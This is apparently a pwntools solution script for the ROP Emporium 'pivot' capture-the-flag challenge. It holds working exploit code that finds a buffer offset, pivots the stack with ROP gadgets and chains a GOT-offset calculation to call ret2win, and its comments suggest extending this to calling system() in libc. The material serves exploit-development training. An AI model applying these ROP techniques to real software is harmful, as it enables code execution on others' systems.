# pivot
# 
# There's only enough space for a small ROP chain on the stack, but
# you've been given space to stash a much larger chain elsewhere.  Learn
# how to pivot the stack onto a new location.
# 
# But why
# To "stack pivot" just means to move the stack pointer elsewhere. It's
# a useful ROP technique and applies in cases where your initial chain
# is limited in size (as it is here) or you've been able to write a ROP
# chain elsewhere in memory (a heap spray perhaps) and need to "pivot"
# onto that new chain because you don't control the stack.
# 
# There's more
# In this challenge you'll also need to apply what you've previously
# learned about the .plt and .got.plt sections of ELF binaries. If you
# haven't already read Appendix A in the Beginners' guide, this would be
# a good time.
# 
# Important!
# This challenge imports a function named foothold_function() from a
# library that also contains a ret2win() function.
# 
# Offset
# The ret2win() function in the libpivot shared object isn't imported,
# but that doesn't mean you can't call it using ROP! You'll need to find
# the .got.plt entry of foothold_function() and add the offset of
# ret2win() to it to resolve its actual address. Notice that
# foothold_function() isn't called during normal program flow, you'll
# have to call it first to update its .got.plt entry.
# 
# Count the ways
# There are a few different ways you could approach this problem;
# printing functions like puts() can be used to leak values from the
# binary, after which execution could be redirected to the start of
# main() for example, where you're able to send a fresh ROP chain that
# contains an address calculated from the leak. Another solution could
# be to modify a .got.plt entry in-place using a write gadget, then
# calling the function whose entry you modified. You could also read a
# .got.plt entry into a register, modify it in-memory, then redirect
# execution to the address in that register.
# 
# Once you've solved this challenge by calling ret2win(), you can try
# applying the same principle to the libc shared object. Use one of the
# many pointers to libc code in the binary to resolve libc (there are
# more than just the .got.plt entries), then call system() with
# a pointer to your command string as its 1st argument, or use a
# one-gagdet. You can also go back and use this technique against
# challenges like "callme".

# $ ./pivot
# pivot by ROP Emporium
# x86_64
# 
# Call ret2win() from libpivot
# The Old Gods kindly bestow upon you a place to pivot: 0x7f8072b2cf10
# Send a ROP chain now and it will land there
# > AAA
# Thank you!
# 
# Now please send your stack smash
# > BBB
# Thank you!
# 
# Exiting


from pwn import *

# Load binary into pwntools
elf = context.binary = ELF('pivot')

# Enable verbose logging
context.log_level = 'debug'

# Figure out length of buffer
io = process(elf.path)

io.sendline("AAAA")

# We will send a 'cyclic' (de Bruijn) pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
# if this does not work, check /proc/sys/kernel/core_pattern
# e.g. echo "/tmp/core.%e.%p.%h.%t" > /proc/sys/kernel/core_pattern
# or simply echo "/tmp/core" > /proc/sys/kernel/core_pattern
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)
bufferlen = cyclic_find(pattern)
info("%s bufferlen", bufferlen)

# $ objdump -D pivot -M intel
# 00000000004009bb <usefulGadgets>:
#   4009bb:	58                   	pop    rax
#   4009bc:	c3                   	ret
#   4009bd:	48 94                	xchg   rsp,rax
#   4009bf:	c3                   	ret
#   4009c0:	48 8b 00             	mov    rax,QWORD PTR [rax]
#   4009c3:	c3                   	ret
#   4009c4:	48 01 e8             	add    rax,rbp
#   4009c7:	c3                   	ret
#   4009c8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
#   4009cf:	00


# Plan for first stage payload (stack pivoting)
# 1. populate rax with the value for the pivot
# 2. exchange rax and rsp
# This payload is sent as a second input to the process, as that
# contains the stack smash.

pop_rax = p64(0x00000000004009bb)
xchg_rax_rsp = p64(0x00000000004009bd)

# Get the leaked pivot address (for first stage payload)
io = process(elf.path)
io.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: 0x")
raw_pivot_addr = io.recvline().strip().rjust(16, b"0")
pivot_addr = u64(binascii.unhexlify(raw_pivot_addr), endian='big')
info(f'Stack pivoting address at {hex(pivot_addr)}')
pivot_addr = p64(pivot_addr)

payload_stage1 = b"".join([
        b"A"*bufferlen,
        pop_rax,
        pivot_addr,
        xchg_rax_rsp
        ])

# Plan for second stage payload
# 1. resolve foothold function to populate got
# 2. put got entry in rax
# 3. dereference rax (mov rax [rax])
# 4. calculate the offset between the foothold adress and ret2win
# 5. put the offset into rbp
# 6. add rbp and rax and put the result in rax
# 7. call rax

foothold_plt = p64(elf.plt["foothold_function"])
foothold_got = p64(elf.got["foothold_function"])

mov_rax_rax = p64(0x00000000004009c0)  # mov rax,QWORD PTR [rax]
add_rax_rbp = p64(0x00000000004009c4)  # add rax,rbp
pop_rbp = p64(0x0000000000400829)  # pop rbp, found in radare with /R pop rbp
call_rax = p64(0x00000000004006b0)  # call rax

lib=ELF("libpivot.so")
win_distance = p64(lib.symbols["ret2win"] -
        lib.symbols["foothold_function"])
# 4. calculate the offset between the foothold adress and ret2win

payload_stage2 = b"".join([
        foothold_plt,  # 1. resolve foothold function to populate got
        pop_rax,       # 2. put got entry in rax
        foothold_got,
        mov_rax_rax,   # 3. dereference rax (mov rax [rax])
        pop_rbp,       # 5. put the offset into rbp
        win_distance,
        add_rax_rbp,   # 6. add rbx and rax and put the result in rax
        call_rax       # 7. call rax
        ])


# Send the payload to a new copy of the process
io.sendline(payload_stage2)
print(io.recv())
io.sendline(payload_stage1)
print(io.recv())
io.wait()

# # Get our flag!
# flag = io.recvline()
# print(flag)
